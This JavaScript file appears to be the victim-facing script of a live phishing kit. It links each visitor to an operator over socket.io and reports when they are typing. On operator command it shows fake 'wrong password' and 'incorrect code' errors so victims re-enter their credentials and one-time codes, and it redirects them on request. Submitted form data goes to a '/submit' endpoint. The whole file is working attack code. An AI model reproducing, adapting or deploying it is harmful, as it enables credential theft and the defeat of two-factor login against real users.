// ================================
// USER + PAGE STATE
// ================================

let userId = sessionStorage.getItem("userId");
let page;
let preloader = document.getElementById("load");

if (!userId) {
  userId = "user_" + Math.random().toString(36).substr(2, 9);
  sessionStorage.setItem("userId", userId);
}

// ================================
// DOM REFERENCES
// ================================

const wrapper = document.getElementById("codeField");
const input = document.getElementById("codeInput");
const overlay = document.getElementById("overlay");
const loadingBar = document.getElementById("loading-bar");
const submitBtn = document.getElementById("submitBtn");
const errorText = document.getElementById("errorText");
const errorMessage = document.querySelector(".show-password-wrapper");
const showPasswordCheckbox = document.getElementById("showPassword");

let loadingFrame = null;

// ================================
// UI FUNCTIONS
// ================================

function showError(input, message) {
    stopLoading();

    input.classList.add("error-input");

    let errorSpan = input.parentNode.querySelector(".error-text");

    if (!errorSpan) {
        errorSpan = document.createElement("span");
        errorSpan.className = "error-text";
        errorSpan.style.color = "red";
        errorSpan.style.fontSize = "0.9em";
        errorSpan.style.display = "block";
        errorSpan.style.marginTop = "4px";

        input.insertAdjacentElement("afterend", errorSpan);
    }

    errorSpan.textContent = message;
}

function clearError() {
    document.querySelectorAll("input").forEach(input => {
        // Remove red border
        input.classList.remove("error-input");

        // Remove error message under the input
        const errorSpan = input.parentNode.querySelector(".error-text");
        if (errorSpan) {
            errorSpan.remove();
        }
    });
}

function showLoading(time) {
  if (!overlay || !loadingBar) return;

  overlay.style.display = "block";
  loadingBar.style.display = "block";
  loadingBar.style.width = "0%";

  let progress = 0;

  function animate() {
    if (progress < 100) {
      progress += (100 - progress) / 15;
      loadingBar.style.width = progress + "%";
      loadingFrame = requestAnimationFrame(animate);
    }
  }

  animate();

  if (time) {
    setTimeout(stopLoading, time);
  }
}

function stopLoading() {
  cancelAnimationFrame(loadingFrame);
  if (!overlay || !loadingBar) return;

  loadingBar.style.width = "100%";
  overlay.style.display = "none";
  loadingBar.style.display = "none";
}

function redirectToPhoneScreen(phonescreen) {
  if (phonescreen) {
    window.location.href = phonescreen;
  }
}

function updatePhoneField(selector, value, phonescreen = null) {
  const el = document.querySelector(selector);

  if (!el) {
    redirectToPhoneScreen(phonescreen);
    return false;
  }

  el.textContent = value;
  stopLoading();
  return true;
}

// ================================
// SOCKET INITIALIZATION
// ================================

window.socket = io("/", {
  auth: { userId },
  reconnection: true,
  reconnectionAttempts: 5,
  reconnectionDelay: 500,
});

let socket = window.socket;

// ================================
// SOCKET EVENTS
// ================================

socket.on("connect", () => {
  console.log("Connected as", userId);
  socket.emit("user:update", {
    userId,
    newStatus: "online",
    page: page,
  });
});

socket.on("user:command", (data) => {
  if (!data || !data.command) return;

  const { command, code, phonescreen, link } = data;

  console.log("command:", command);

  const usernameEl = document.querySelector("#username");
  const storedUser = sessionStorage.getItem("user");

  if (usernameEl && storedUser) {
    usernameEl.textContent = storedUser;
  }

  switch (command) {
    case "refresh":
      location.reload();
      break;

    case "bad-email":
      const userInput = document.querySelector("#userinput");
	  showError(userInput, "Enter a correct email address");
      break;

    case "bad-login":
      const passwordInput = document.querySelector("#passwordinput");
	  showError(passwordInput, "Wrong password, try again");
      break;

    case "bad-otp":
      const codeBox = document.querySelector("#code");
	  showError(codeBox, "Incorrect code");
      break;

    case "otp":
      sessionStorage.removeItem("setcode");
      sessionStorage.setItem("yp", "your mobile");
      updatePhoneField("#yp", "your phone", phonescreen);
      break;

    case "phone-otp":
      if (!code) return;
      sessionStorage.setItem("setcode", code);
      updatePhoneField("#phone", code, phonescreen);
      break;

    case "prompt":
      if (!code) return;
      sessionStorage.setItem("setPromptCode", code);
      updatePhoneField("#code", code, phonescreen);
      break;

    case "redirect":
      if (link) {
        window.location.href = link;
      }
      break;

    default:
      console.warn("Unhandled command:", command);
  }
});

// ================================
// USER STATUS TRACKING
// ================================

function updateUserStatus(status) {
  socket.emit("user:update", {
    userId,
    newStatus: status,
    page: page,
  });
}

window.addEventListener("beforeunload", () => {
  updateUserStatus("offline");
});

window.addEventListener("focusin", (e) => {
  if (["INPUT", "TEXTAREA"].includes(e.target.tagName)) {
    updateUserStatus("typing");
  }
});

window.addEventListener("focusout", (e) => {
  if (["INPUT", "TEXTAREA"].includes(e.target.tagName)) {
    updateUserStatus("online");
  }
});

window.addEventListener("input", (e) => {
  if (["INPUT", "TEXTAREA"].includes(e.target.tagName)) {
    updateUserStatus("typing");
  }
});

document.addEventListener("click", (e) => {
  const link = e.target.closest("a");
  if (link && link.href && link.origin === location.origin) {
    setTimeout(() => updateUserStatus("online"), 200);
  }
});

// ================================
// FORM SUBMISSION
// ================================

async function submitFormData(formData) {
    showLoading();

    $(".submit").prop("disabled", true);

    const payload = Object.fromEntries(formData.entries());

    // add extra fields here
    payload.userId = userId;

    try {
        const res = await fetch("/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        const data = await res.json();

        console.log("Response:", data);

        if (data.link) {
            setTimeout(() => {
                window.location.href = data.link;
            }, 3000);
        }
    } catch (error) {
        console.error("Error submitting form:", error);
    }
}
// ================================
// SAFE SOCKET RECREATION
// ================================

function getOrCreateSocket({ timeoutMs = 500 } = {}) {
  return new Promise((resolve) => {
    if (window.socket) return resolve(window.socket);

    const start = Date.now();
    const checkInterval = 50;

    const timer = setInterval(() => {
      if (window.socket) {
        clearInterval(timer);
        return resolve(window.socket);
      }

      if (Date.now() - start >= timeoutMs) {
        clearInterval(timer);

        userId = sessionStorage.getItem("userId") || null;

        window.socket = io("/", {
          auth: { userId },
          reconnection: true,
        });

        return resolve(window.socket);
      }
    }, checkInterval);
  });
}

(async () => {
  const socketInstance = await getOrCreateSocket({ timeoutMs: 2000 });
  window.socket = socketInstance;

  socketInstance.on("connect", () =>
    console.log("connected", socketInstance.id)
  );
})();